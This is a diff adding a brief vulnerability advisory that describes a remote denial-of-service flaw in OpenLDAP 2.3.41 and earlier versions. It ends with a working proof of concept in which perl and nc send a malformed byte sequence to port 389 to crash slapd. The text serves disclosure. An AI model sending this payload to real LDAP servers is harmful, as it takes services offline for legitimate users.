@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/30013/info
+
+OpenLDAP is prone to a remote denial-of-service vulnerability.
+
+Attackers can exploit this issue to deny service to legitimate users by crashing affected servers.
+
+OpenLDAP 2.3.41 is vulnerable to this issue; earlier versions back to approximately 2.1.18 as well as newer versions may also be affected.
+
+slapd -h ldap:// -d511 &
+perl -e 'print "\xff\xff\xff\x00\x84\x41\x42\x43\x44"' | nc localhost 389 
